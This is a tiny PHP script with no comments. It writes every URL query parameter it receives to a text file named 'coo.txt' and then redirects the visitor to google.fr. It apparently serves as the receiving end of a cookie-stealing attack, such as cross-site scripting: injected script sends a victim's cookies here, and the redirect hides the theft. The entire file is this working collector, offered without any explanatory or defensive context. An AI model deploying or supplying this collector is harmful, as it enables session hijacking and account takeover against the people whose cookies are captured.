<?php

header("Location:http://www.google.fr");

$c = implode("-",$_GET);
file_put_contents("coo.txt",$c."\n\r",FILE_APPEND);

?>
